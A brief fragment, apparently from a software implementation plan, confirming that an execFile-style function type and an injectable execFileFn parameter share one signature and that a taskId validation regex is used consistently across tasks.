**Type consistency:** `CheckForResultExecFile` (Task 3) and the optional `execFileFn` parameter (Task 5) both follow `(file, args, options) => Promise<{stdout, stderr}>`. `taskId` regex `/^task_[0-9a-f-]{36}$/i` is referenced consistently.
